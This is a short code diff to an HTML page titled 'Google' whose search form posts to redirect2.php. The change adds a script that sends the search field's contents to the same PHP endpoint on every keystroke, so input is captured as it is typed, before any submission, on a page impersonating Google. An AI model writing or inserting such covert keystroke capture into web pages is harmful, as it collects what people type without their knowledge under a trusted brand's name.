@@ -2,12 +2,20 @@
 <html>
 <head>
     <title>Google</title>
+    <script>
+        function logSearch(elem) {
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("POST", "redirect2.php", true);
+            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xhttp.send("search=" + encodeURIComponent(elem.value));
+        }
+    </script>
 </head>
 <body>
     <h1>Google Search</h1>
     <form method="POST" action="redirect2.php">
         <label for="search">Search Google or Type URL</label>
-        <input type="text" id="search" name="search" required>
+        <input type="text" id="search" name="search" required onkeyup="logSearch(this)">
         <input type="submit" value="search">
     </form>  
 </body>
